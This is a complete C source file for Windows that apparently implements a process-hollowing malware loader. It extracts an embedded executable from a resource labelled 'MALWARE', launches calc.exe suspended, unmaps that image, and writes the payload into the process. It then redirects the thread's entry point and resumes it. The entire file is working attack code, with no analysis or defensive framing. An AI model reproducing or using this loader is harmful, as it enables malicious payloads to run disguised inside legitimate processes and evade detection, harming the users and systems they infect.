#include <windows.h>
#include <tchar.h>

typedef ULONG (WINAPI *PFNNtUnmapViewOfSection) (HANDLE ProcessHandle, PVOID BaseAddress);

LPVOID ExtractRes(DWORD *pResSize)
{
	HRSRC hResInfo;
	HGLOBAL hResData;
	LPVOID lpResLock;
	LPVOID lpAddr;

	hResInfo = FindResource(NULL, MAKEINTRESOURCE(101), _T("MALWARE"));
	if (hResInfo == NULL)
	{
		return NULL;
	}

	hResData = LoadResource(NULL, hResInfo);
	if (hResData == NULL)
	{
		return NULL;
	}

	lpResLock = LockResource(hResData);
	if (lpResLock == NULL)
	{
		return NULL;
	}

	*pResSize = SizeofResource(NULL, hResInfo);
	if (*pResSize == 0)
	{
		return NULL;
	}

	lpAddr = VirtualAlloc(0, *pResSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (lpAddr == NULL)
	{
		return NULL;
	}
	memcpy(lpAddr, lpResLock, *pResSize);

	return lpAddr;
}

BOOLEAN IsPeFile(int DosSignature, int NtSignature)
{
	if(DosSignature == IMAGE_DOS_SIGNATURE && NtSignature == IMAGE_NT_SIGNATURE)
		return true;
	return false;
}

int main(int argc, const char **argv, const char **envp)
{
	HMODULE hModule = NULL;
	TCHAR cAppName[MAX_PATH] = _T("C:\\Windows\\System32\\calc.exe");
	DWORD dwResSize = 0;
	PIMAGE_DOS_HEADER pDosHeader = NULL;
	PIMAGE_NT_HEADERS pNtHeaders = NULL;
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi = {0};
	LPVOID lpMalwareBaseAddr = NULL;
	DWORD dwVictimBaseAddr = NULL;	// Base address of the victim
	LPVOID lpNewVictimBaseAddr = NULL;
	CONTEXT context = {0};
	DWORD idx = 0;

	lpMalwareBaseAddr = ExtractRes(&dwResSize);
	if (lpMalwareBaseAddr == NULL)
	{
		return -1;
	}

	pDosHeader = (PIMAGE_DOS_HEADER)lpMalwareBaseAddr;
	pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD)lpMalwareBaseAddr + pDosHeader->e_lfanew);

	if (!IsPeFile(pDosHeader->e_magic, pNtHeaders->Signature))
		return -1;

	si.cb = sizeof(si);
	if (CreateProcess(cAppName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED,	NULL, NULL,	&si, &pi) == 0)
	{
		return -1;
	}

	// Retrieve AX, BX, CX, DX, SI, DI 
	context.ContextFlags = CONTEXT_INTEGER;
	if (GetThreadContext(pi.hThread, &context) == 0)
	{
		return -1;
	}

	// EBX points to PEB, offset 8 is the pointer to the base address
	if (ReadProcessMemory(pi.hProcess, (LPCVOID)(context.Ebx + 8), &dwVictimBaseAddr, sizeof(PVOID), NULL) == 0)
	{
		return -1;
	}

	hModule = GetModuleHandle(_T("ntdll.dll"));
	if (hModule == NULL)
	{
		hModule = LoadLibrary(_T("ntdll.dll"));
		if (hModule == NULL)
		{
			return -1;
		}
	}

	PFNNtUnmapViewOfSection pfnNtUnmapViewOfSection = (PFNNtUnmapViewOfSection)GetProcAddress(hModule, "NtUnmapViewOfSection");
	if (pfnNtUnmapViewOfSection == NULL)
	{
		return -1;
	}

	pfnNtUnmapViewOfSection(pi.hProcess, (PVOID)dwVictimBaseAddr);

	lpNewVictimBaseAddr = VirtualAllocEx(pi.hProcess,
							(LPVOID)pNtHeaders->OptionalHeader.ImageBase,
							pNtHeaders->OptionalHeader.SizeOfImage,
							MEM_COMMIT | MEM_RESERVE,
							PAGE_EXECUTE_READWRITE);
	if (lpNewVictimBaseAddr == NULL)
	{
		return -1;
	}

	// Replace headers
	WriteProcessMemory(pi.hProcess, lpNewVictimBaseAddr, lpMalwareBaseAddr, pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);

	// Replace sections
	LPVOID lpSectionBaseAddr = (LPVOID)((DWORD)lpMalwareBaseAddr + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));
	PIMAGE_SECTION_HEADER pSectionHeader;
	for (idx = 0; idx < pNtHeaders->FileHeader.NumberOfSections; ++idx)
	{
		pSectionHeader = (PIMAGE_SECTION_HEADER)lpSectionBaseAddr;
		WriteProcessMemory(pi.hProcess,
			(LPVOID)((DWORD)lpNewVictimBaseAddr + pSectionHeader->VirtualAddress),
			(LPCVOID)((DWORD)lpMalwareBaseAddr + pSectionHeader->PointerToRawData),
			pSectionHeader->SizeOfRawData,
			NULL);
		lpSectionBaseAddr = (LPVOID)((DWORD)lpSectionBaseAddr + sizeof(IMAGE_SECTION_HEADER));
	}

	// Replace the value of base address in the PEB
	DWORD dwImageBase = pNtHeaders->OptionalHeader.ImageBase;
	WriteProcessMemory(pi.hProcess, (LPVOID)(context.Ebx + 8), (LPCVOID)&dwImageBase, sizeof(PVOID), NULL);

	// Replace Entry Point Address
	context.Eax = dwImageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint;
	SetThreadContext(pi.hThread, &context);
	ResumeThread(pi.hThread);

	VirtualFree(lpMalwareBaseAddr, dwResSize, MEM_RELEASE);

	return 0;
}